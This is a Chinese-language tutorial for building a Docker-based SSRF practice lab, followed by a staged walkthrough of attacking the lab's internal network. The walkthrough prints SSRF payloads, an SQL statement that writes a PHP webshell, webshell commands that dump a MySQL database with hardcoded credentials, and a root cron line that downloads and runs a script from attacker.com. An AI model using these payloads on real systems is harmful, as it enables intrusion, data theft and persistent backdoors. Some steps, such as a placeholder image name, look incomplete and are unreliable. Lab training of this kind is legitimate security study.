# SSRF靶场搭建-有问题

## **第一部分：基础SSRF靶场部署**

###  🎯 目标

快速搭建一个纯粹的SSRF漏洞测试环境，用于验证漏洞存在性和基础利用。

### 📦 使用镜像

`vulhub/ssrf:latest`

### ✅ 部署步骤

#### 第1步：拉取镜像

打开 **PowerShell** ，执行：
    
    
    docker pull vulhub/ssrf:latest

等待下载完成，看到 `Status: Downloaded newer image` 提示。

#### 第2步：运行容器
    
    
    docker run -d --name basic-ssrf -p 8080:80 vulhub/ssrf:latest

#### 第3步：访问验证

  1. 打开浏览器访问：`http://localhost:8080`
  2. 你应该看到一个简单的输入界面

到此就可以做简单的测试了。

### 🔬 基础测试

在输入框中尝试以下payload：

测试类型| 测试Payload| 预期结果  
---|---|---  
**漏洞验证**| ` https://www.baidu.com`| 返回百度首页HTML源码  
**文件读取**| ` file:///etc/passwd`| 显示容器用户列表  
**内网探测**| ` http://172.17.0.1`| 返回连接状态  
  
### 🛠️ 管理命令

powershell
    
    
    # 查看状态
    docker ps
    
    # 停止靶场
    docker stop basic-ssrf
    
    # 删除靶场
    docker rm basic-ssrf

* * *

## **第二部分：完全版实战内网渗透靶场**

###  🎯 目标场景

模拟真实企业环境：

  * **边界服务器** ：存在SSRF漏洞的对外服务
  * **内网Web应用** ：存在SQL注入、文件上传等漏洞的内部系统
  * **核心数据库** ：完全隐藏在内网的数据库服务器
  * **管理后台** ：内网的管理系统

### 📦 环境架构

text
    
    
    [攻击者] → [SSRF边界服务器:8080] → (Docker内网) → [内网Web应用] → [核心数据库]
                                              ↘ [管理后台]

### ✅ 完整部署步骤

#### 第1步：创建专用Docker网络

powershell
    
    
    # 创建独立的网络环境，模拟企业内网
    docker network create --subnet=172.20.0.0/24 enterprise-net

#### 第2步：部署SSRF边界服务器

powershell
    
    
    # 边界服务器 - 对外提供服务
    docker run -d --name ssrf-gateway --network enterprise-net -p 8080:80 vulhub/ssrf:latest

#### 第3步：部署内网Web应用（DVWA）

powershell
    
    
    # 内网Web应用 - 无对外端口，只能通过内网访问
    docker run -d --name internal-web --network enterprise-net -p 0:80 vulnerables/web-dvwa

**初始化DVWA：**

  1. 访问 `http://localhost:8080` (通过SSRF代理访问)
  2. 输入：`http://internal-web/setup.php`
  3. 点击"Create/Reset Database"
  4. 登录账号：`admin` / `password`

#### 第4步：部署核心数据库

powershell
    
    
    # 内网数据库 - 完全隐藏，无任何端口映射
    docker run -d --name core-db --network enterprise-net -e MYSQL_ROOT_PASSWORD=Root123! -e MYSQL_DATABASE=app_db mysql:5.7

#### 第5步：部署内网管理后台

powershell
    
    
    # 内网管理后台 - 存在漏洞的管理系统
    docker run -d --name admin-panel --network enterprise-net -e MYSQL_HOST=core-db -e MYSQL_USER=root -e MYSQL_PASSWORD=Root123! -e MYSQL_DATABASE=app_db some-management-app:latest

 _注：如无特定管理镜像，可用另一个DVWA替代_

###  🎯 完整攻击链实战

#### 阶段一：外网侦察与立足

  1. **发现SSRF漏洞**

    * 访问 `http://localhost:8080`
    * 测试：`https://www.baidu.com` （验证漏洞）

**内网服务发现**

  2. powershell

    
    
    # 通过SSRF扫描内网
    # 在SSRF界面输入以下地址进行探测：
    http://internal-web/              # 发现内网Web应用
    http://core-db:3306/             # 探测数据库端口
    http://admin-panel/              # 发现管理后台

#### 阶段二：横向移动 - 攻击内网Web应用

  1. **通过SSRF访问内网DVWA**

    * 在SSRF界面输入：`http://internal-web/vulnerabilities/sqli/?id=1&Submit=Submit`
    * 观察返回的页面，确认可以访问

**利用SQL注入获取Webshell**

    * 通过SSRF发送SQL注入payload到DVWA
    * 利用文件写入功能上传Webshell：

  2. sqlSELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'
  3. **通过SSRF执行命令**

    * 访问：`http://internal-web/shell.php?cmd=whoami`
    * 查看命令执行结果

#### 阶段三：内网深度渗透

**从Web应用攻击数据库**

  1. powershell

    
    
    # 在internal-web容器内连接数据库
    # 通过SSRF执行：
    http://internal-web/shell.php?cmd=mysql -h core-db -uroot -pRoot123! -e "show databases;"

**窃取核心数据**

  2. powershell

    
    
    # 导出数据库数据
    http://internal-web/shell.php?cmd=mysqldump -h core-db -uroot -pRoot123! app_db > /tmp/data.sql

  3. **攻击管理后台**

    * 通过SSRF探测：`http://admin-panel/login.php`
    * 尝试弱口令爆破或已知漏洞

#### 阶段四：权限提升与持久化

**容器内提权**

  1. powershell

    
    
    # 查找SUID权限文件
    http://internal-web/shell.php?cmd=find / -perm -u=s -type f 2>/dev/null
    
    # 内核漏洞检测
    http://internal-web/shell.php?cmd=uname -a

**建立持久化后门**

  2. powershell

    
    
    # 添加定时任务
    http://internal-web/shell.php?cmd=echo "*/5 * * * * curl http://attacker.com/backdoor.sh | sh" >> /var/spool/cron/crontabs/root

### 🛠️ 环境管理命令

powershell
    
    
    # 一键启动所有服务
    docker start ssrf-gateway internal-web core-db admin-panel
    
    # 一键停止所有服务
    docker stop ssrf-gateway internal-web core-db admin-panel
    
    # 查看网络状态
    docker network inspect enterprise-net
    
    # 彻底清理环境
    docker rm -f ssrf-gateway internal-web core-db admin-panel
    docker network rm enterprise-net

### 📊 两种方案对比

特性| 基础SSRF靶场| 完整内网靶场  
---|---|---  
**部署复杂度**|  ⭐☆☆☆☆ (非常简单)| ⭐⭐⭐⭐☆ (中等)  
**真实度**|  ⭐⭐☆☆☆ (较低)| ⭐⭐⭐⭐⭐ (很高)  
**攻击面**|  单一SSRF漏洞| 多漏洞组合  
**学习价值**|  基础漏洞验证| 完整渗透流程  
**适合阶段**|  初学者入门| 进阶实战练习  
  
### 🎯 使用建议

  1. **新手入门** ：先熟练掌握基础SSRF靶场的所有测试方法
  2. **技能提升** ：在基础靶场上增加1-2个内网服务进行简单横向移动练习
  3. **实战模拟** ：部署完整内网靶场，体验真实渗透测试全流程
  4. **技能考核** ：用完整靶场进行红蓝对抗或CTF练习

这个完整方案让你从一个简单的SSRF漏洞开始，最终能够掌控整个"企业内网"，完美模拟了真实世界中的高级持续威胁(APT)攻击模式。

---
*迁移自语雀文档，原始ID: cn7h3s06cqvm5alw*